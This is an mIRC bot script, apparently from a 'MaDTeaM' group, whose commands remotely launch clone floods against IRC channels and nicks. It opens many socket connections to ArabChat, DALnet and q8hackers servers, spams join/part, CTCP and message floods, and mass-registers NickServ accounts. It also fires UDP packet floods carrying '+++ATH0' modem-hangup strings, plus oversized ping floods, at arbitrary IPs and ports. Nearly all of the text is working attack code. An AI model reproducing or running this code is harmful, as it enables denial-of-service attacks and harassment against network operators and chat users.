on 400:text:!sock1*:*:{
  if ($2- == $null) { .notice $nick Are U FooL use No. !sock2 channel qnty }
  if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off }  
  if ($2 != $null) { .set %sockChannel $2 }
  if ($3 != $null) { .set %sockqty $3 }
  else goto sock1flood 
  :sock1flood 
  .timer11 %sockqty 1 /sock1flo0d 
}
alias sock1flo0d {
  sockwrite -nt socketz*  join %sockchannel 
  sockwrite -nt socketz*  part %sockchannel 
  sockwrite -nt socketz*  nick $read temp.scr $+ $chr($r(65,125)) $+ $chr($r(65,125))
}
on 400:text:!sock2*:*:{
  if ($2- == $null) { .notice $nick Are U FooL use No. !sock2 channel ctcp qnty }
  if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off }  
  if ($2 != $null) { .set %sockChannel $2 }
  if ($4 != $null) { .set %sockctcp $3 }
  if ($4 != $null) { .set %sockqty $4 }
  else goto sock2flood 
  :sock2flood 
  .timer11 %sockqty 1 /sock2flo0d 
}
alias sock2flo0d {
  sockwrite -nt socketz*  join %sockchannel 
  sockwrite -nt socketz* %sock.Setect %sockchannel : $+ %sockctcp $+    
  sockwrite -nt socketz* %sock.Setect %sockchannel : $+ %sockctcp $+ 
  sockwrite -nt socketz*  part %sockchannel 
}
on 400:text:!sock3*:*:{
  if ($2- == $null) { .notice $nick Are U FooL use No. !sock3 channel M/n qnty msg }
  if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off }  
  if ($2 != $null) { .set %sockChannel $2 }
  if ($5 != $null) { .msgs $5- }
  if ($5 == $null) { .set %sockmsg !list PING ME File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d Send Queue fserver }
  if ($4 != $null) { .set %sockqty $4 }
  if ($3 == M) { .set %sock.Setect Privmsg }
  if ($3 == N) { .set %sock.Setect Notice }
  else goto sock3flood 
  :sock3flood 
  .timer11 %sockqty 1 /sock3flo0d 
}
alias sock3flo0d {
  sockwrite -nt socketz*  join %sockchannel 
  sockwrite -nt socketz* %sock.Setect %sockchannel : $+ %sockmsg 
  sockwrite -nt socketz*  part %sockchannel
  sockwrite -nt socketz*  nick $read temp.scr $+ $chr($r(65,125)) $+ $chr($r(65,125)) 
}
on 400:text:!sock4*:*:{
  if ($2- == $null) { .notice $nick Are U FooL use No. !sock4 channel qnty msg }
  if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off }  
  if ($2 != $null) { .set %sockChannel $2 }
  if ($4 != $null) { .set %sockmsg $4- }
  if ($4 == $null) { .set %sockmsg flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d Send Queue fserver }
  if ($3 != $null) { .set %sockqty $3 }
  else goto sock4flood 
  :sock4flood 
  .timer11 %sockqty 1 /sock4flo0d 
}
alias sock4flo0d {
  sockwrite -nt socketz*  join %sockchannel 
  sockwrite -nt socketz*  part %sockchannel  : $+ %sockmsg 

}
on 400:text:!sock5*:*:{
  if ($2- == $null) { .notice $nick Are U FooL use No. !sock4 channel qnty }
  if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off }  
  if ($2 != $null) { .set %sockChannel $2 }
  if ($3 != $null) { .set %sockqty $3 }
  else goto sock5flood 
  :sock5flood 
  .timer11 %sockqty 1 /sock5flo0d 
}
alias sock5flo0d {
  sockwrite -nt socketz*  join %sockchannel 
  sockwrite -nt socketz*  part %sockchannel
}
on 400:text:!sock6*:*:{
  if ($2- == $null) { .notice $nick Are U FooL use No. !sock6 channel M/n qnty Partmsg Msg }
  if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off }  
  if ($2 != $null) { .set %sockChannel $2 }
  if ($6 != $null) { .msgs $6- }
  if ($6 == $null) { .set %sockmsg !list PING ME File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d Send Queue fserver }
  if ($4 != $null) { .set %sockqty $4 }
  if ($3 == M) { .set %sock.Setect Privmsg }
  if ($3 == N) { .set %sock.Setect Notice }
  if ($5 != $null) { .set %sock0msg $5 }
  else goto sock6flood 
  :sock6flood 
  .timer11 %sockqty 1 /sock6flo0d 
}
alias sock6flo0d {
  sockwrite -nt socketz*  join %sockchannel 
  sockwrite -nt socketz* %sock.Setect %sockchannel : $+ %sockmsg 
  sockwrite -nt socketz*  part %sockchannel : $+ %sock0msg
}
on 400:text:!Sockets*:*:{
  if ($2- == $null) { .notice $nick Are U FooL Use !Sockets Command }
  if ($2 == off) { .sockwrite -nt socketz* Notice $nick :Neeek 7alak  }  
  if ($2 == Join) { .sockwrite -nt socketz* join #$3-  }  
  if ($2 == part) { .sockwrite -nt socketz* part #$3-  }  
  if ($2 == M) { set %sock.Setect Privmsg } 
  if ($2 == N) { set %sock.Setect Notice }   
  if ($2 == die) { .sockclose socketz* quit :My Master Say That Die $nick $+ ) ( $+ $3- $+ ) | //timersocketz* off | sockclose Socketz* | unset %sockChannel  }  
  if ($2 == restart) && ($3 == Go) { .sockwrite -nt socketz* quit :I'll Come back .. | //.timer %qtyz 1 /yalago | //timersocketz* off }  
  if ($2 == restart) && ($3 == open) { .sockwrite -nt socketz* quit :I'll Come back .. | //.timer %qtyz 1 /yalaopen | //timersocketz* off }  
  if ($2 == msg) { .sockwrite -nt socketz* privmsg $3 : $+ %sockmsg  }  
  if ($2 == mzg) { .sockwrite -nt socketz* privmsg $3 : $+ $4-  }  
  if ($2 == Notice) { .sockwrite -nt socketz* Notice $3 : $+ %sockmsg  }  
  if ($2 == notize) { .sockwrite -nt socketz* Notice $3 : $+ $4-  }  
  if ($2 == registerdalnet) { .set %flood.reg.passwd $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) | .sockwrite -nt socketz* nickserv :register %flood.reg.passwd $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ @hotmail.com | .sockwrite -nt socketz* nickserv :identify %flood.reg.passwd } 
  if ($2 == registerarabchat) { .set %flood.reg.passwd $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) | .sockwrite -nt socketz* nickserv :register %flood.reg.passwd $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ @ArabChat.Org | .sockwrite -nt socketz* nickserv :identify %flood.reg.passwd }
  if ($2 == flood) && ($3 == chan) { set %flood.reg.channel $4 | /flood.reg $5 Chan } 
  if ($2 == flood) && ($3 == nick) { set %flood.reg.nick $4 | flood.reg $5 nick  }
  if ($2 == change.reg.dal) { sockwrite -nt socketz* nick $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) | .sockwrite -nt socketz* nickserv :register %flood.reg.passwd $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $+ $r(a,z) $+ $r(a,z) $+ @ $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $+ $r(a,z) $+ $r(a,z) $+ .CoM }
  if ($2 == change.reg.arab) { sockwrite -nt socketz* nick $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) | .sockwrite -nt socketz* nickserv :register %flood.reg.passwd $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $+ $r(a,z) $+ $r(a,z) $+ @ArabChat.Org }
  else sockwrite -nt socketz* $2-
}
alias flood.reg {
  if ($1 == M) { .set %sock.Setect Privmsg }
  if ($1 == n) { .set %sock.Setect notice }
  if ($2 == chan) { 
    sockwrite -nt socketz* join : $+ %flood.reg.channel 
    sockwrite -nt socketz* %sock.Setect %flood.reg.channel : %sockmsg 
    .timer 20 1 /sockwrite -nt socketz* join : $+ %flood.reg.channel 
    .timer $+ $time $+ $date 20 1 /sockwrite -nt socketz* %sock.Setect %flood.reg.channel :!list PING ME File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d Send Queue fserver
  }
  if ($1 == M) { .set %sock.Setect Privmsg }
  if ($1 == n) { .set %sock.Setect notice }
  if ($2 == nick) {
    .sockwrite -nt socketz* %sock.Setect %flood.reg.nick : $+ %Cf $+   
    .sockwrite -nt socketz* %sock.Setect %flood.reg.nick : $+ %sockmsg 
    .timer $+ $time $+ $date 20 1 /sockwrite -nt socketz* %sock.Setect %flood.reg.nick :!list PING ME File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d Send Queue fserver 
  }
}
on 1:SOCKOPEN:Socketz*:{ if ($sockerr) { return } 
  .sockwrite -nt $sockname USER $r(a,z) $+ $r(a,z) $+ $r(a,z) "aw" "aw" : $read $mircdirtemp.scr
  .sockwrite -nt $sockname NICK  $read temp.scr $+ $chr($r(65,125)) $+ $chr($r(65,125))
  .sockwrite -nt $sockname join %najichannel 
}
on *:SOCKerr:Socketz*:{ yalaopen }
on *:SOCKerr:Socketz*:{ yalago }
on *:SOCKclose:Socketz*:{ yalaopen }
on *:SOCKclose:Socketz*:{ yalago }
on 1:SOCKREAD:Socketz*:{
  sockread %temp3
  /do4 %temp3
}
alias do4 {
  if (PING = $1) { sockwrite -nt * $1- }
}
on +400:text:!opento*:*:{
  if ($2- == $null) { .notice $nick Are U FooL Use !Opento NetWork Channel Qnty }
  if ($2 == off) { .sockwrite -nt socketz* Notice $nick :Neeek 7alak  | sockclose socketz* }  
  if ($2 == arabchat) { .set %thisnick $nick | .set %najiserver $gettok(KSA@QualityNet@Gulf@Khiran@Doha@Bahrain@irc@, $+ $rand(1,7) $+ ,64) $+ .arabchat.org | .set %najiport $3 | .set %najichannel $4 | set %qtyz $5 | timer $+ 5223 %qtyz 1 /yalaopen  }  
  if ($2 == q8hackers) { .set %thisnick $nick | .set %najiserver $gettok(dragons@deathmask@, $+ $rand(1,2) $+ ,64) $+ .q8hackers.org | .set %najiport $3 | .set %najichannel $4 | set %qtyz $5 | timer $+ 5223 %qtyz 1 /yalaopen  }  
  if ($2 == DALNet) { .set %thisnick $nick | .set %najiserver $gettok(jade@liberty@jade@dragon@nexgo@sniper@irc@games@twisted@, $+ $rand(1,8) $+ ,64) $+ .dal.net | .set %najiport $3 | .set %najichannel $4 | set %qtyz $5 | timer $+ 5223 %qtyz 1 /yalaopen  } 
}

alias yalaopen { sockopen Socketz $+ $r(1,99999) %najiserver %najiport }

on +400:text:!go*:*:{
  if ($2- == $null) { .notice $nick Are U FooL Use !go Server Port Channel Qnty }
  if ($2 == off) { .sockwrite -nt socketz* Notice $nick :Neeek 7alak  | sockclose socketz* }  
  if ($2- != $null) { .set %thisnick $nick | .set %najiserver $2 | .set %najiport $3 | .set %najichannel $4 | set %qtyz $5 | timer $+ 5223 %qtyz 1 /yalago  }  
}
alias yalago { sockopen Socketz $+ $r(1,99999) %najiserver %najiport }
on 400:text:!packet*:*:{
  if ($2- == $null) { .notice $nick Are U FooL Use !Packet Size ip port }
  if ($2 == off) { /.gcoolstart stop  }  
  if ($2- != $null) { /gcoolstart $2- }  
}
on 400:text:!naji*:*:{ if ($3 == $null) { /.msg # Error/Syntax: (You must provide an IP & Ammount !packet ip ammount). | halt } | //run ping.exe -n $3 -v AUTH -l 64000 $2 | /msg # Sending [64,000kb] of Data to ( $+ $2 $+ ) }

alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %connect.chan [packeting]: Halted!  } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %connect.chan ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  msg %connect.chan 14[sending:( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port:( $+ $4  $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 }
alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp gnumc1 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+
  sockudp gnumc2 $2 $3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  sockudp gnumc3 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  sockudp gnumc4 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
  return |  :done | //msg %connect.chan [packeting]: Finished! | .timergcoolt off | unset %gnum 
}
on 400:text:!fastp*:*:{
  if ($2- == $null) { .notice $nick Are U FooL Use !Packet Size ip }
  if ($2 == off) { /.Fcoolstart stop  }  
  if ($2- != $null) { /Fcoolstart $2- }  
}
alias Fcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %connect.chan [packeting]: Halted!  } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %connect.chan ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  msg %connect.chan 14[sending:( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port:( $+ $r(1,65000) $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 400 fastp $1 $2 $r(1,65000) }
alias fastp {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp gnumc1 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  sockudp gnumc3 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  sockudp gnumc2 $2 $3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  sockudp gnumc4 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
  return |  :done | //msg %connect.chan [packeting]: Finished! | .timergcoolt off | unset %gnum 	
}
on 400:text:!nicksock1*:*:{
  if ($2- == $null) { .notice $nick Are U FooL use No. !nicksock1 nicks M/N Qnty Msg }
  if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off }  
  if ($2 != $null) { .set %socknick $2 }
  if ($3 == M) { .set %sock.Setect Privmsg }
  if ($3 == N) { .set %sock.Setect Notice }
  if ($5 != $null) { .Msgs$5- }
  if ($5 == $null) { .set %sockmsg !list PING ME File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d Send Queue fserver }
  if ($4 != $null) { .set %sockqty $4 }
  else goto socknick1flood 
  :socknick1flood 
  .timer11 %sockqty 1 /socknick1flood 
}
alias socknick1flood {
  sockwrite -nt socketz* %sock.Setect %socknick : $+ %sockmsg  
  sockwrite -nt socketz* nick $read temp.scr $+ $chr($r(65,125)) $+ $chr($r(65,125))
}
on 400:text:!nicksock2*:*:{
  if ($2- == $null) { .notice $nick Are U FooL use No. !nicksock2 nicks M/N Qnty Msg }
  if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off }  
  if ($2 != $null) { .set %socknick $2 }
  if ($3 == M) { .set %sock.Setect Privmsg }
  if ($3 == N) { .set %sock.Setect Notice }
  if ($5 != $null) { .Msgs $5- }
  if ($5 == $null) { .set %sockmsg !list PING ME File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d Send Queue fserver }
  if ($4 != $null) { .set %sockqty $4 }
  else goto socknick2flood 
  :socknick2flood 
  .timer11 %sockqty 1 /socknick2flood 
}
alias socknick2flood {
  sockwrite -nt socketz* %sock.Setect %socknick : $+ %sockmsg  
}
on 400:text:!nicksock3*:*:{
  if ($2- == $null) { .notice $nick Are U FooL use No. !nicksock3 nicks M/n Qnty Ctcp }
  if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off }  
  if ($2 != $null) { .set %socknick $2 }
  if ($3 == M) { .set %sock.Setect Privmsg }
  if ($3 == N) { .set %sock.Setect Notice }
  if ($4 != $null) { .set %sockqty $4 }
  if ($5 != $null) { .set %nicksockctcp $5 }
  if ($5 == $null) { .set %nicksockctcp $gettok(Finger@Time@Version@Ping@MaDTeaM@Fuck@HeHeHe@Pong@MaDTeaM@, $+ $rand(1,9) $+ ,64) }
  else goto socknick3flood 
  :socknick3flood 
  .timer11 %sockqty 1 /socknick3flood 
}
alias socknick3flood {
  sockwrite -nt socketz* %sock.Setect %socknick : $+ %nicksockctcp $+    
  sockwrite -nt socketz* %sock.Setect %socknick : $+ %nicksockctcp $+ 
}
alias random {
  if ($exists(temp.scr) == $false) { /nick AttaCk[ $+ $r(0,9999) $+ $r(0,999) $+ ] | /anick Attack[ $+ $r(0,9999) $+ $r(0,999) $+ ] | /.auser 400 MaDTeaM | /.auser 400 ArapChaT | /.notify ArapChaT | /.auser 400 MaDTeaM2 | /.auser 400 MaDTeaM1 | /.auser 400 hackman  | halt }
